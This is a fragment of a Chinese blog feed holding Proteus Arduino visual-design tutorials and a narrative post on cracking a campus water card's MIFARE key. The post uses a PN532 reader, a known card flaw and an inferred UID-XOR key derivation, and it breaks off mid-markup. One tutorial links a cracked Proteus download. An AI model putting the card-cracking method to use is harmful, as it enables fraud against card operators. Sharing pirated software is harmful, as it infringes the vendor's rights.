module。这是一个很方便的模块，它的使用方法如下：</p><p><img src="https://s2.loli.net/2022/02/03/hiWaJ6PbjGz5NvD.png"></p><ul><li>init：数码管初始化，数码管不显示。</li><li>setBrightness：设置数码管显示亮度,。不亮、标准亮度和高亮显示</li><li>display：数码管显示数值(0<del>9,A</del>F)<br>            pos:位置(0<del>3)<br>            value:数值(0</del>9,A~F)                          </li><li>decPoint：秒点显示,TRUE&#x3D;on亮，FALSE&#x3D;off灭</li></ul><p><strong>例程硬件设计——添加数码管模块</strong></p><p><img src="https://s2.loli.net/2022/02/03/3KSrlh7V1XxyJDj.png" alt="添加数码管模块"></p><p><strong>例程软件设计——SETUP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/03/wP6vpmRjdZEFVTQ.png"></p><p><strong>例程软件设计——LOOP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/03/1qeXvG85KsdkBN4.png"></p><h2 id="2-LCD1602显示器"><a href="#2-LCD1602显示器" class="headerlink" title="2.LCD1602显示器"></a>2.LCD1602显示器</h2><h4 id="（1）LCD1602显示屏的介绍"><a href="#（1）LCD1602显示屏的介绍" class="headerlink" title="（1）LCD1602显示屏的介绍"></a>（1）LCD1602显示屏的介绍</h4><p>LCD1602显示屏图片如下：</p><p><img src="https://s2.loli.net/2022/02/03/hxVqJzWkiu34mAC.png"></p><p><img src="https://s2.loli.net/2022/02/03/3eO6VZoWGQNI4Rt.png" alt="16字符X2行液晶显示屏"></p><p>LCD1602显示屏的一些特点：</p><ul><li>优点：微功耗、体积小、重量轻、超薄</li><li>应用场合：袖珍式仪表和低功耗应用系统中。</li><li>控制器：日立公司HD44780控制器</li><li>显示：160个字符，可以自定义8个字符</li></ul><p>可显示字符5*7点阵，共160个字符</p><p><img src="https://s2.loli.net/2022/02/09/tywbTNqor3KX5kH.png" alt="可以显示160个字符"></p><p>LCD1602的接口电路：</p><p><img src="https://s2.loli.net/2022/02/03/p18leQrTJYtdKWg.png"></p><h4 id="（2）proteus中可供使用的LCD1602模块"><a href="#（2）proteus中可供使用的LCD1602模块" class="headerlink" title="（2）proteus中可供使用的LCD1602模块"></a>（2）proteus中可供使用的LCD1602模块</h4><p>在proteus中，可供使用的LCD1602模块有两种，一种是6线制接口，一种是2线制接口。</p><p><img src="https://s2.loli.net/2022/02/03/6gF2leOLRxHrsn1.png" alt="Breakout Perpherals 6线制接口"></p><p><img src="https://s2.loli.net/2022/02/03/q3n4Y9sUPgfIFx2.png" alt="Grove 2线制接口"></p><p>不管是6线制接口，还是2线制接口的LCD1602模块，proteus都提供有相对应的可视化设计的例程，比如6线制接口的例程是：</p><p><strong>No.11</strong> <strong>Arduino Real Time Clock with Alphanumeric LCD breakout board.</strong> </p><p>  The example shows simple use of both breakout boards.</p><p><img src="https://s2.loli.net/2022/02/03/hWGpRT4sBUmD9iN.png" alt="例程的原理图，这个例程是一个实时日历时钟"></p><p>LCD1602六线制模块的方法如下：</p><p><img src="https://s2.loli.net/2022/02/03/57ZEHdubqg4D9Bc.png"></p><p>现在我们来看一下这个例程的流程图：</p><p><img src="https://s2.loli.net/2022/02/09/iP5u2vmZbUKqfRy.png"></p><p><img src="https://s2.loli.net/2022/02/09/VuSG1KCaTnsjBUt.png" alt="仿真验证"></p><p>可以看到，这个例程的设计非常简单，这也是可视化设计非常对初学者来说最好的地方，内部封装了一些函数，可以直接调用即可，十分的简洁。接下来我们来看一下2线制模块的例程。</p><p><strong>No.51</strong> <strong>FizzBuzz solution problem - LCD version.</strong> </p><p>   A solution for the FizzBuzz puzzle problem.</p><p><img src="https://s2.loli.net/2022/02/09/OTkn2tJaNiRSFUf.png"></p><p>FizzBuzz问题是一种英国学校学生经常玩的游戏。举个“FizzBuzz 问题”的例子：</p><blockquote><p>写一个程序打印1到100这些数字。但是遇到数字为3的倍数的时候，打印“Fizz”替代数字，5的倍数用“Buzz”代替，既是3的倍数又是5的倍数打印“FizzBuzz”。</p></blockquote><p>可以看到，你甚至可以用proteus可视化设计来编写游戏，并且如果你有相应的硬件，你甚至可以直接烧录到板子上，可以说是非常的实用了！</p><p><img src="https://s2.loli.net/2022/02/09/FGCiP1xa3nEkJIf.png" alt="流程图"></p><p>流程图的逻辑非常易懂，通过判断数字的模来输出结果。</p><h2 id="3-OLED12864显示屏"><a href="#3-OLED12864显示屏" class="headerlink" title="3.OLED12864显示屏"></a>3.OLED12864显示屏</h2><h4 id="1-OLED12864显示屏的介绍"><a href="#1-OLED12864显示屏的介绍" class="headerlink" title="(1).OLED12864显示屏的介绍"></a>(1).OLED12864显示屏的介绍</h4><p>​       **有机发光二极管(Organic Light-Emitting Diode, OLED)**又称为有机电激光显示、有机发光半导体。由美籍华裔教授邓青云(Ching W. Tang)于1979年在实验室中发现。OLED显示技术具有自发光、广视角、几乎无穷高的对比度、较低耗电、极高反应速度等优点。但是，作为高端显示屏，价格上也会比液晶电视要贵。</p><p><img src="https://s2.loli.net/2022/02/09/nPkCbjom3pOMdWq.png" alt="OLED12864显示屏为128*64点阵，可以显示西文字符、中文汉字和点阵图形"></p><p><img src="https://s2.loli.net/2022/02/09/wagnA1jIShNKHsp.png" alt="显示中文字符"></p><h4 id="2-proteus中可供使用的OLED12864模块"><a href="#2-proteus中可供使用的OLED12864模块" class="headerlink" title="(2).proteus中可供使用的OLED12864模块"></a>(2).proteus中可供使用的OLED12864模块</h4><p>在proteus可视化设计中，提供了这个模块，并且方法很多</p><p><img src="https://s2.loli.net/2022/02/09/xhrAPKMbS3oZCdV.png"></p><p>先来看看模块的方法：</p><p><img src="https://s2.loli.net/2022/02/09/fm6ntwUDEOJ5Wzb.png" alt="还没完呢"></p><p><img src="https://s2.loli.net/2022/02/09/OmPj2g8b3GUtTdv.png"></p><p>可以看到，这个模块的方法是真的多，想要学习它的用法的话，不妨看看这个模块的例程，proteus也提供了它的例程。</p><h4 id="3-例程介绍"><a href="#3-例程介绍" class="headerlink" title="(3)例程介绍"></a>(3)例程介绍</h4><p><strong>No.66</strong> <strong>Grove OLED 128x64dot Print on graphics display</strong> </p><p> Simple example on how to print texts on LY190-128064 OLED graphics display</p><p><img src="https://s2.loli.net/2022/02/09/pnQfMTYx2KUPZ8s.png" alt="No.66原理图"></p><p><strong>流程图——SETUP部分：</strong></p><p><img src="https://s2.loli.net/2022/02/09/AqNu45WDITYKgVP.png"></p><p><strong>LOOP部分</strong>(这个部分比较冗长，用了几个子函数)</p><p><img src="https://s2.loli.net/2022/02/09/gJdr5yVZRaKqA6Q.png"></p><p><img src="https://s2.loli.net/2022/02/09/h4VJUxaNI2SEG1L.png"></p><p><img src="https://s2.loli.net/2022/02/09/uyNV3Av2Bs8GPZK.png"></p><p>流程图比较长，我就不逐个注释了，其实还是挺好懂的。无非就是调用了模块的一些函数。</p><h2 id="4-显示屏模块使用实战"><a href="#4-显示屏模块使用实战" class="headerlink" title="4.显示屏模块使用实战"></a>4.显示屏模块使用实战</h2><p>前面介绍了三种显示屏的用法，想必大家此时已经摩拳擦掌跃跃欲试了，这里给大家布置个小作业。结合上一篇文章介绍的LED模块，这次来设计一个<strong>带有倒计时的红绿灯</strong>，具体要求如下：</p><p><img src="https://s2.loli.net/2022/02/09/VqfxYGIdNz4Re2D.png"></p><p>感兴趣可以做一下，底下贴一下我的流程图：</p><p><strong>SETUP部分：</strong></p><p><img src="https://s2.loli.net/2022/02/09/azbL3ftHoKNQT8M.png"></p><p><strong>LOOP部分：</strong></p><p><img src="https://s2.loli.net/2022/02/09/8meOvfx3d9MWqbP.png"></p><p>仿真验证：</p><p><img src="https://s2.loli.net/2022/02/09/uBqmgUfTY6SJzd3.png" alt="绿灯"></p><p><img src="https://s2.loli.net/2022/02/09/qCVANzdwhkvJBcs.png" alt="黄灯"></p><p><img src="https://s2.loli.net/2022/02/09/BsVRogKqNelLfaM.png" alt="红灯"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Proteus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>基于proteus的可视化设计(2)——LED模块</title>
      
      <link href="/archives/bcaeb128.html"/>
      <url>/archives/bcaeb128.html</url>
      
        <content type="html"><![CDATA[<p>在上一篇文章中，介绍了proteus可视化设计的一些基本操作，今天我们来介绍第一种组件的使用——-LED控制。</p><h3 id="1-LED模块的选择"><a href="#1-LED模块的选择" class="headerlink" title="1.LED模块的选择"></a>1.LED模块的选择</h3><p>在Proteus中，一共有7种软件自身提供的模块，如下图：</p><p><img src="https://s2.loli.net/2022/01/30/XAkIU98Rcw2zuZQ.png"></p><p>这里可使用的LED模块有<strong>Breakout Perifherals</strong>里的和<strong>Grove</strong>里的，这两种LED灯都有红、黄、蓝、绿四种颜色，两种LED灯的区别在于接线方式不同</p><p><img src="https://s2.loli.net/2022/01/30/AeOXCZGl7oVKQab.png" alt="Breakout Perifherals模块里的LED"></p><p><img src="https://s2.loli.net/2022/01/30/1Is6pKj9vYWEVHF.png" alt="Grove模块里的LED"></p><p><img src="https://s2.loli.net/2022/01/30/RFOdxBc6SjmNkbn.png" alt="Breakout Perifherals模块里的LED原理图"></p><p><img src="https://s2.loli.net/2022/01/30/JkK9sgxz7NQd1Zb.png" alt="Grove模块里的LED原理图"></p><p>在原理图中双击Grove LED，可以看到connector ID，这里用的是D2到D8这6个数字端口，当你有多个Grove LED时，应该设置不同的端口，否则在编译过程中会报错；双击Arduino LED可以看到，Arduino LED可以使用IO0到IO19这20个输入输出端口，比Grove LED的可用端口要多，当你的程序所需的LED灯数量比较大时，Arduino LED是不错的选择。</p><p><img src="https://s2.loli.net/2022/01/30/ynhz2VmQl9siTUo.png" alt="Arduino LED的端口"><img src="https://s2.loli.net/2022/01/30/ldUFoYrzLs8MHD9.png" alt="Grove LED的端口"></p><p>这里补充一点，Grove LED的四个引脚都代表什么，如图，第一和第二引脚都是数字端口，第三个引脚是VCC，第四个引脚GND也就是接地。虽然Grove LED只使用一个引脚（即图中的D2，第二个引脚为proteus自动设置的），但是在编译过程中经常会出现一种情况：当你放置了多个Grove LED模块时，即使设置了不同的数字端口，编译时仍出现端口占用的情况。解决方法很简单，只需要给被占用的Grove LED模块设置一个新的端口，然后再设置成原来的端口，就可以解决问题了。<br><img src="https://s2.loli.net/2022/01/30/WIEKw52tipmgdky.png" alt="Grove LED的引脚图"></p><h3 id="2-LED模块的使用方法"><a href="#2-LED模块的使用方法" class="headerlink" title="2.LED模块的使用方法"></a>2.LED模块的使用方法</h3><p>前面介绍了两种LED模块，虽然这两种模块的来源不同，但是其方法时相同的。这里以Grove LED为例：</p><p><img src="https://s2.loli.net/2022/01/30/zK4muCOks79Wrqa.png" alt="LED模块的方法"></p><p><strong>on：端口输出高电平，LED发光</strong></p><p><strong>off：端口输出低电平，LED熄灭</strong></p><p><strong>set：设置LED发光&#x2F;熄灭；TRUE&#x3D;on</strong><br>                                           <strong>FLASE&#x3D;off</strong></p><p><strong>dim：端口PWM输出,可以调光(0~255)</strong></p><p><strong>toggle：LED发光状态取反</strong></p><h4 id="（1）LED的闪烁"><a href="#（1）LED的闪烁" class="headerlink" title="（1）LED的闪烁"></a>（1）LED的闪烁</h4><p>只要将你所需的方法直接拖到流程图中就可以使用了，这里我们先做一个小实验，让LED灯闪烁，示例流程图如下：</p><p><img src="https://s2.loli.net/2022/01/30/iuonlGYtBJDjPUK.png"></p><p>编译运行一下：</p><p><img src="https://s2.loli.net/2022/01/30/QN94numX5UoHTIC.png"><img src="https://s2.loli.net/2022/01/30/cS4GhwI75RKO36o.png"></p><p>可以看到，LED灯就开始每秒闪烁一次了，是不是很简单？接下来我们来做一下键控LED灯，</p><h4 id="（2）键控LED"><a href="#（2）键控LED" class="headerlink" title="（2）键控LED"></a>（2）键控LED</h4><p>键控LED就是<strong>按键控制LED灯，按键按下时，对应LED发光，按键松开后LED灯熄灭。</strong>要用到的按钮模块选择Grove里的按钮模块，</p><p><img src="https://s2.loli.net/2022/01/30/zjHIZhb4o12Nuqf.png"></p><p>原理图：</p><p><img src="https://s2.loli.net/2022/01/30/1kjAqTJoDCYaWIg.png"></p><p>当按键按下时，端口D2输入高电平；当按键松开时，端口D2输入低电平。按键模块只有一个方法，即判断按键是否被按下，键控LED流程图如下：</p><p><img src="https://s2.loli.net/2022/01/30/ySDrvAH4sQ1lEVN.png"></p><p>当按键按下时，LED灯会一直亮着；当按键松开时，LED灯熄灭。从而实现键控LED效果</p><p><img src="https://s2.loli.net/2022/01/30/nsYmJzD4Q1lF7ea.png"></p><h4 id="（3）-流水灯控制"><a href="#（3）-流水灯控制" class="headerlink" title="（3） 流水灯控制"></a>（3） 流水灯控制</h4><p><strong>LED流水灯控制</strong>实际上就是多个LED发光二极管依次一个一个发光，每个发光管点亮约1秒。这种控制规律称为“流水灯”控制。这里以四个LED灯为例，给大家做一个流水灯的程序，效果图。</p><p><img src="https://s2.loli.net/2022/02/01/y58cPRfqndoG6t1.png" alt="四个LED的流水灯控制"></p><p>流程图<strong>SETUP部分：</strong></p><p><img src="https://s2.loli.net/2022/02/01/n5rpzVo6Cimj9kB.png"></p><p>流程图<strong>LOOP部分：</strong></p><p><img src="https://s2.loli.net/2022/02/01/8jzBsh6Mn7oKqgZ.png" alt="主程序"></p><p>子程序：</p><p><img src="https://s2.loli.net/2022/02/01/wauy4P8qvRgYNMI.png" alt="子程序"></p><p>这个流水灯的逻辑很简单，首先先是SETUP时初始化每个LED灯，即把状态设置成OFF，然后每个子程序负责点亮一个LED，熄灭剩下三个LED。这样子就实现了流水灯控制。</p><h3 id="3-LED模块使用实战"><a href="#3-LED模块使用实战" class="headerlink" title="3.LED模块使用实战"></a>3.LED模块使用实战</h3><p>前面两部分已经详细的介绍了LED的一些用法，相信看到这里的各位已经对LED的使用完全掌握了，现在给大家布置一个小作业：<strong>实现简易红绿灯</strong>，具体要求如下：</p><p><img src="https://s2.loli.net/2022/02/01/dkSJ5OG3m9qPg6t.png" alt="第一个作业要求"></p><p>感兴趣可以做一下，底下我贴一下我的流程图：</p><p><img src="https://s2.loli.net/2022/02/01/SrBLJEIxuedlQX3.png" alt="流程图"></p><p>原理图：</p><p><img src="https://s2.loli.net/2022/02/01/3I6ufamH7CglGbF.png" alt="原理图"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Proteus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>基于proteus的可视化设计(1)——基础介绍</title>
      
      <link href="/archives/6a55821b.html"/>
      <url>/archives/6a55821b.html</url>
      
        <content type="html"><![CDATA[<p>Hello，大家好，这里是LMark，今天来给大家分享proteus软件的仿真设计的一些方法，如有错误，欢迎大家指正。我首先声明一下，本人为计算机专业大一学生，对单片机开发只是一个兴趣爱好，并不会在这里介绍太多原理性的内容（主要是我也不是很懂哈哈哈），主要介绍介绍proteus这个软件中，基于arduino uno板的可视化设计(visual Designer)方法。OK，接下来让我们进入正题。</p><p>​关于Proteus的介绍，这里摘抄一段百度百科的介绍：</p><blockquote><p> Proteus软件是英国Lab Center Electronics公司出版的EDA工具软件。它不仅具有其它EDA工具软件的仿真功能，还能仿真单片机及外围器件。它是比较好的仿真单片机及外围器件的工具。虽然国内推广刚起步，但已受到单片机爱好者、从事单片机教学的教师、致力于单片机开发应用的科技工作者的青睐。</p></blockquote><p>就是这么一个功能强大的软件，成为了许多老师们上课喜欢用的软件。我们学校有老师开了一门单片机学习入门的课，就是用proteus来教学的。先来看看proteus长啥样：</p><p><img src="https://s2.loli.net/2022/01/29/1WsFjBXNIlyAvYc.png"></p><p>现在proteus最新版本已经到了8.13，从8.6开始，proteus就已经支持可视化设计，那有人要问了：什么是可视化设计呀? </p><p><strong>可视化（Visual）程序设计其实是一种全新的程序设计方法。</strong></p><blockquote><p><strong>它主要是让程序设计人员利用软件本身所提供的各种控件，像搭积木一样来构造应用程序的各种界面。</strong> <strong>Proteus</strong>软件的可视化设计<strong>Visual Designer</strong>是一个独特的开发工具，同时使用流程图和<strong>Arduino</strong>开发板通过拖放的外围设备模块来设计基于<strong>Arduin</strong>嵌入式系统的程序设计。并且设计好的程序可以直接烧录到对应的板子上。</p></blockquote><p>要想用proteus进行可视化设计，得要1.安装proteus8.6及以上的版本。2.软件需要破解。proteus破解版在网上搜可以搜索到很多，我这里给一个proteus8.11的破解版：<a href="https://pan.baidu.com/s/1QCxhFQWl4XzPcNVOcg_Czw">https://pan.baidu.com/s/1QCxhFQWl4XzPcNVOcg_Czw</a>   提取码：sc8a</p><h2 id="1-创建可视化设计工程"><a href="#1-创建可视化设计工程" class="headerlink" title="1.创建可视化设计工程"></a>1.创建可视化设计工程</h2><p>首先打开软件，可以看到这样的界面，点击“New Flowchart”（我的proteus是汉化过的，汉化的方法百度上有很多，以后会讲讲）</p><p><img src="https://s2.loli.net/2022/01/29/AbQeq74tcDo5xyF.png"></p><p>点击“下一步”</p><p><img src="https://s2.loli.net/2022/01/29/vh8HNQs1IXizbJa.png"></p><p>然后就按照默认配置即可，最后点击“完成”即可创建。</p><h2 id="2-界面介绍"><a href="#2-界面介绍" class="headerlink" title="2.界面介绍"></a>2.界面介绍</h2><p>原理图界面，在这里可以摆放部件的位置，对部件的属性进行修改</p><p><img src="https://s2.loli.net/2022/01/29/Dux2p38XEOCY65k.png"></p><p>流程图界面，在这里可以进行程序的设计</p><p><img src="https://s2.loli.net/2022/01/29/fvbYQgB6Fz8OUC7.png"></p><h2 id="3-可视化设计基本方法介绍"><a href="#3-可视化设计基本方法介绍" class="headerlink" title="3.可视化设计基本方法介绍"></a>3.可视化设计基本方法介绍</h2><p>以刚刚的工程为例，可视化原理图搭建完成后，将界面切换至可视化界面，从左边工程树中的Peripherals选项中，我们可以看到cpu和timer1两个关于Arduino开发平台的方法库：</p><p><img src="https://s2.loli.net/2022/01/30/S8HFInczCLbNOhs.png"></p><h4 id="cpu模块的方法"><a href="#cpu模块的方法" class="headerlink" title="cpu模块的方法"></a>cpu模块的方法</h4><p>单击cpu左边的三角，弹出cpu相关的方法：</p><p>pinMode（配置引脚模块，指定引脚和方向）</p><p>analogReference（配置模拟引脚参考电压模块）</p><p>analogWrite（写入模拟量模块）</p><p>analogRead（读取模拟量模块）</p><p>digitalWrite（写入数字量模块，指定输出引脚和高低电平）</p><p>digitalRead（读取数字量模块）</p><p>pulseIn（读取脉冲时间模块）</p><p>millis（延时模块）</p><p>enableInterrupt（启用中断模块）</p><p>disableInterrupt（禁用终端模块）</p><p>debug(调试模块)等等</p><p><img src="https://s2.loli.net/2022/01/30/Z82nzGi4UXoysc3.png"></p><h4 id="timer1模块的方法"><a href="#timer1模块的方法" class="headerlink" title="timer1模块的方法"></a>timer1模块的方法</h4><p>单击timer1左边的三角，弹出timer1相关的方法：</p><p>initialize（初始化模块）</p><p>setPeriod（设置频率模块）</p><p>start（启动模块）</p><p>stop（停止模块）</p><p>restart（重启模块）</p><p>resume（继续模块）</p><p>read（读取模块）</p><p>pwm（启用PWM模块）</p><p>disablepwm（禁用PWM模块）</p><p>setPwmDuty（设置PWM占空比模块）</p><p><img src="https://s2.loli.net/2022/01/30/Y5ys48PL2QpAatU.png"></p><h4 id="基本逻辑框图"><a href="#基本逻辑框图" class="headerlink" title="基本逻辑框图"></a>基本逻辑框图</h4><p>从工程树的右边可以看到基本逻辑框图，如下图所示：</p><p><img src="https://s2.loli.net/2022/01/30/zWuhaMGO1ErptAq.png" alt="流程图中的基本逻辑框图"></p><p>需要使用的时候只需要将对应的框拖动到流程图中即可,在这里简单介绍几个逻辑框图的用法。首先，是赋值&#x2F;分配模块，该模块是变量赋值的工具，可以在赋值&#x2F;分配模块中完成创建新变量、编辑变量和删除变量等操作，可用的变量类型如下：</p><p><img src="https://s2.loli.net/2022/01/30/aEYybHV4cNxvR6g.png" alt="可视化设计中的变量的类型"></p><p><img src="https://s2.loli.net/2022/02/11/2P1DtsyaXRCgwbH.png"></p><p>和C语言差不多，有布尔类型，整型，浮点型，字符串型等等，后面的TIME是时间类型（之后的文章会介绍），还有一个HANDLE（句柄）我也没用过。其次，介绍一下决策&#x2F;判断模块，双击该模块，在Condition中填入判断的条件；右键点击该模块，选择“Swap Yes&#x2F;No”，可以交换流程图中的Yes和No的分支。</p><p><img src="https://s2.loli.net/2022/01/30/8gnBGM3FosKCam2.png" alt="判断模块"><img src="https://s2.loli.net/2022/01/30/eIMNr85RTaBclVZ.png" alt="交换Yes和No"></p><p>然后介绍一下循环模块，这个循环模块里包含了三种循环，分别是计数循环（Count Loop）、For-Next循环（For-Next Loop）、While-Wend循环（While-Wend Loop）和Repeat-Until循环（Repeat-Until Loop）。后面三种循环分别对应着C语言中的FOR循环、While循环和While-Until循环。</p><p>最后告诉大家一个小技巧，当你的流程图过长时，你可以把流程图分开成两个，操作方法是右键单击要分离的地方并Split（分离）向导线即可，如图所示：</p><p><img src="https://s2.loli.net/2022/01/30/mKWHu3kt25eUQcf.png"><img src="https://s2.loli.net/2022/01/30/mps9S8WZdKLDvjt.png"><img src="https://s2.loli.net/2022/01/30/AGZzHFmqoyWxJMb.png"></p><h4 id="系统仿真"><a href="#系统仿真" class="headerlink" title="系统仿真"></a>系统仿真</h4><p><strong>开始仿真：</strong>若要开始仿真，可以单击动画控制面板上的“播放”按钮。程序将进行编译并且仿真进度将在状态栏上显示：</p><p><img src="https://s2.loli.net/2022/01/30/7VxU5rYJ9O8lt2E.png" alt="第一个"></p><p><strong>停止仿真：</strong>若要停止仿真，可以单击动画控制面板上的“停止”按钮，整个工程将停止仿真。</p><p><img src="https://s2.loli.net/2022/01/30/kxhK1N95mj6teF3.png" alt="第四个"></p><p><strong>暂停仿真：</strong>暂停Proteus仿真是一个重要的概念。当仿真暂停时，程序和元器件处于当前静止状态，例如，电容器不会放电，电机将保持其角位置和动量，这样便可以是用户检查程序和虚拟硬件。若要暂停仿真，可以单击动画控制面板上的“暂停”按钮。</p><p><img src="https://s2.loli.net/2022/01/30/oIdv7l8anJQOYV4.png" alt="第三个"></p><h4 id="串行口通信模块"><a href="#串行口通信模块" class="headerlink" title="串行口通信模块"></a>串行口通信模块</h4><p>在可视化设计中，有时候需要实时查看一些变量的值来检查程序是否正常运行，当你的程序中没有显示屏的时候，串口通信模块就能发挥大用处，软件里提供了这个模块</p><p><img src="https://s2.loli.net/2022/02/11/pMASxXbFc7E64lP.png"></p><p>如图，在Grove中的UART。</p><p><img src="https://s2.loli.net/2022/02/11/m3oeF4EkxatJKIu.png"></p><p>方法：</p><ul><li>1.print:屏幕打印字符</li><li>2.println:屏幕打印字符，并换行回车</li><li>3.setBase:设置数据打印进制数</li><li>4.setPlaces:设置数据打印保留几位小数点</li></ul><p>方法很简单，就是print嘛，举个例子，输出一个字符串：</p><p><img src="https://s2.loli.net/2022/02/11/tsiWvHFObe2uyg9.png"></p><p>效果：</p><p><img src="https://s2.loli.net/2022/02/11/2SZd3ApnVXrPCLz.png"></p><p>这样就在屏幕上打开了！如果你一不小心点了右上角的X关掉了，下次模拟仿真的时候是不会出现的，需要手动打开，打开方法：</p><p>点击调试</p><p><img src="https://s2.loli.net/2022/02/11/9GVg4W3A2EyaBDF.png"></p><p>然后勾选这个VT的选项即可</p><p><img src="https://s2.loli.net/2022/02/11/YAT8nP3cHGF2LWl.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Proteus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>IC卡秘钥算法破解的一次尝试</title>
      
      <link href="/archives/b79c4a06.html"/>
      <url>/archives/b79c4a06.html</url>
      
        <content type="html"><![CDATA[<p>Hello大家好，这里是LanternMark，今天给大家分享一下我的一次水卡破解经历。</p><p>（本文只技术交流分享，滥用者自行承担责任，与本文作者无关）</p><h3 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0.前言"></a>0x0.前言</h3><p>​<strong>IC卡</strong>，即Integrated Circuit Card，集成电路卡,像我们平常看到的银行卡，地铁卡，还有校园里的饭卡，智能校徽等等，这些都属于IC卡。想必大家一定不陌生，但是大家有没有关注过IC卡的原理以及安全性。希望通过这篇文章，给大家一些启发。</p><h3 id="0x1-准备工作"><a href="#0x1-准备工作" class="headerlink" title="0x1.准备工作"></a>0x1.准备工作</h3><p>​<strong>工欲善其事，必先利其器。</strong>在开始读卡之前，先准备好以下的东西:</p><ul><li>一块读卡芯片（比如PN532）</li><li>一台有NFC功能的手机，和配套的软件（比如MCT）</li><li>一张水卡</li><li>一颗耐心(很重要)</li></ul><p>​    芯片这里我用的是PN532，一块很便宜的读卡芯片，某宝上30多就能买到了，都准备好之后，就可以开始破解了。</p><h3 id="0x2-开始破解"><a href="#0x2-开始破解" class="headerlink" title="0x2.开始破解"></a>0x2.开始破解</h3><p>​首先，先打开手机的NFC功能，读取一下这张水卡，会得到以下的结果。</p><p><img src="https://s2.loli.net/2022/01/19/n2aFzDm46Icd7A1.jpg"></p><p><img src="https://s2.loli.net/2022/01/19/khfsmgKjar8ivtO.jpg"></p><p>​可以看到，除了13扇区之外，其他扇区都是用的默认密钥，这就给这张卡片带来了很大的安全风险，因为像这种没有全部加密（半加密）的卡片，是可以利用IC卡漏洞轻松破解的，这里我们来用PN532配套的上位机尝试破解一下。</p><p>结果如下图：</p><p><img src="https://s2.loli.net/2022/01/19/TvoRFf3WdtHALGi.jpg" alt="很轻松就能获取13扇区的密钥"></p><p>用了三分钟，秘钥就很轻松的被破解出来了，可见这种IC卡的安全性真的不高。不过用漏洞破解不是本文的重点，本文主要分享一个业余的人破解秘钥的过程。</p><h3 id="0x3-数据分析"><a href="#0x3-数据分析" class="headerlink" title="0x3.数据分析"></a>0x3.数据分析</h3><p>​通过上面一张卡的数据，我还是看不出来有什么联系，所以我又找了另外一些卡来破解寻找UID和密钥的关系。在扫了10+张卡片后，我可以初步知道UID和密钥的映射关系。</p><p>​                     <img src="https://s2.loli.net/2022/01/19/GBC5kYt2LOnSDfy.jpg" alt="第一行是UID，第二行是Key"></p><p>​由于这种卡的KeyB都是相同的，只有KeyA不一样，所以UID决定的是KeyA，而且KeyA有六位，而UID只有四位，通过上图，我们可以清晰地看到UID地每一位都决定着Key的一位。</p><p><img src="https://s2.loli.net/2022/01/19/QYRqbiGvDIgFAzZ.jpg" alt="映射关系"></p><p>​知道了这个以后，事情就变得简单了起来（也许吧），只要找出每一位Key的映射关系，就能破解出密钥的计算公式。接下来就来讲讲我破解密码的过程，在IC卡中，运算关系无非是加减乘除，异或和取反等等，只要有足够的数据，连蒙带猜，应该能推算出来，就拿第一位来说，通过UID和对应的Key位进行运算，可以很容易看出是有规律的。</p><p><img src="https://s2.loli.net/2022/01/19/KXEyUcPTxn8sbfa.jpg" alt="异或结果都是1E"></p><p>​异或结果都相同，也就是说，由UID XOR 1E &#x3D;&#x3D; 对应的Key，这样第一个映射关系就找出来了。第一位key的对应关系被这么容易找出来了，使我备受鼓舞，可开始找第二位Key的对应关系的时候，就遇到了困难。</p><p>作为一名高三学生，对于这方面并没有太多的专业知识，就连异或也是只了解一丢丢。对于密钥破解，只能是不停的猜测，比如破解第二位Key。</p><p><img src="https://s2.loli.net/2022/01/19/Ak9jmKyC73R264N.jpg" alt="第二位Key"></p><p>可以看到，第二个数字是通过 异或 1得到的结果，而第一位，就显得没有规律了，比如图中的</p><p>​<strong>6</strong>0  —&gt;  <strong>8</strong>1    </p><p>​<strong>6</strong>B  —&gt;  <strong>B</strong>1 </p><p>​    </p><p>​出现了两个自变量对一个因变量的情况，这就很麻烦了，无法直接地观察。于是乎，我就把这些数据对应关系列出来，得到了以下的对应表 :</p><p><img src="https://s2.loli.net/2022/01/19/6Alh7bOcfsjWQ92.jpg" alt="看起来毫无规律的表"></p><p>   这使得我当时破解工作陷入了低迷，，，但是，我没有放弃，我想:我看不懂的东西，应该是我不会的东西，那就只有异或是我没掌握的了。为此，我开始去钻研异或，还特意画了一张异或关系表</p><p><img src="https://s2.loli.net/2022/01/19/ts36yeqkB8mpd25.jpg" alt="我知道我的字不好看"></p><p>正是这张表，为后来的破解工作提供了很大的帮助，通过这张表，我了解到了异或的一些规律，比如相邻的两个数字对应的异或值也是相邻的。有了这张表，在结合上面的对应关系，我隐隐约约感觉到Key的计算是和异或有些关系，于是我开始了头脑风暴。我试了很多种模型，没有成功，但每次失败，都让我感受到离成功更近一步，终于，在一个炎热的午后（没错，南方的十二月还是很热的），一次英语听力即将开始的时候，我终于看出来了。</p><p>​首先，我发现虽然这些数没有直接的异或关系，但是不同异或结果之间的绝对距离是不变的，也就是说，只要我根据结果的数据之间相隔多少距离，可以反推出对应的异或的数字，比如说2往上数刚好隔了五个单位到8，又隔了三个单位到12(C),又隔了一个单位到14(E),这样的关系，让我联想到了凯撒密码</p><p><img src="https://s2.loli.net/2022/01/19/GNdn9rjCvTIgxRW.jpg" alt="交错对应"></p><p> 这样的结果，都可以由UID 异或 0 得到结果，再类比凯撒密码，我得到了以下的对应关系</p><p><img src="https://s2.loli.net/2022/01/19/DE8BtK7YLrS5ATm.jpg" alt="黑色是确定的数据，红色的是猜测的数据"></p><p>   可以看到，大部分数据还是符合关系的，只有一小部分不符合关系，而这不符合关系的一小部分数字，都是对应着下一位的数字，也就是说，由于某种原因，导致了数字进了一位，接下来，只要找出为什么进位就可以了，这是又要进行大数据分析了，列表 </p><p><img src="https://s2.loli.net/2022/01/19/Li6ElRksVvf2Ku3.jpg" alt="清晰明了"></p><p>​通过对比，不难发现，要进位的UID第二位数都大于8，而不用进位的数字第二位数都小于9，至此，这位Key的映射关系已经出来了，接下来要做的，就是用数据验证猜想，为此，我又去找了10+张卡来验证，发现都符合我的结论，可以说，在一定范围内，我的猜想是成立的。Key的第二位破解工作圆满完成！</p><p>​剩下的4位Key也可以了这样类似的方法破解出来的，这里我就不一一赘述了。</p><h3 id="0x4-结果验证"><a href="#0x4-结果验证" class="headerlink" 